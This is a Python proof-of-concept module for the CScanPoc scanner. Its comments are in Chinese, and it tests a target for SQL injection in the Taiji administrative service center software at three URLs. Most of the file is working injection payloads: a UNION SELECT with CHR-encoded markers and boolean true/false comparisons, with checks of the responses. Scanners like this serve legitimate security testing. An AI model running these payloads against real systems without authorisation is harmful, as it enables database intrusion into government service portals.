# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    vuln_id = 'Taiji_0001' # 平台漏洞编号，留空
    name = '太极行政服务中心 SQL注入' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-02-27'  # 漏洞公布时间
    desc = '''
        太极行政服务中心多处处SQL注入:
        /bmtd.do?method=dept&deptid=00942001
        /newsinfo.do?id=wtfwablsfdsi
        /morebrowsnews.do?type=12335421
    ''' # 漏洞描述
    ref = 'Unkonwn' # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=085183
    cnvd_id = 'Unkonwn' # cnvd漏洞编号
    cve_id = 'Unkonwn' #cve编号
    product = '太极行政服务中心'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '7389d8c1-3e09-4f4d-970f-220368fa239c'
    author = '国光'  # POC编写者
    create_date = '2018-05-25' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            # proxy = ('1237.0.0.1', 8887)
            #第一处
            url = arg + '/bmtd.do?method=dept&deptid=00942001%27%20union%20select%20CHR(87)||CHR(116)||CHR(70)||CHR(97)||CHR(66)||CHR(99)%20from%20dual--'
            code, head, res, err, _ = hh.http(url)
            if(code == 200) and ('WtFaBc' in res):
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
            #第二处
            url_true = arg + '/newsinfo.do?id=wtfwablsfdsi%27%20or%201234%2B5432=6666%20and%20rownum<2--&type=7'
            url_false = arg + '/newsinfo.do?id=wtfwablsfdsi%27%20or%201234%2B5432=6667%20and%20rownum<2--&type=7'
            code, head, res_true, err, _ = hh.http(url_true)
            if code != 200:
                return False
            code, head, res_false, err, _ = hh.http(url_false)
            if code != 200:
                return False
            if ('null' in res_false) and ('null' not in res_true):
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
            #第三处
            url_true = arg + '/morebrowsnews.do?type=12335421%20or%201234%2B5432=6666'
            url_false = arg + '/morebrowsnews.do?type=12335421%20or%201234%2B5432=6667'
            code, head, res_true, err, _ = hh.http(url_true)
            if code != 200:
                return False
            code, head, res_false, err, _ = hh.http(url_false)
            if code != 200:
                return False
            pattern = '<a href="newsinfo.do?id='
            if (pattern in res_true) and (pattern not in res_false):
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()


if __name__ == '__main__':
    Poc().run()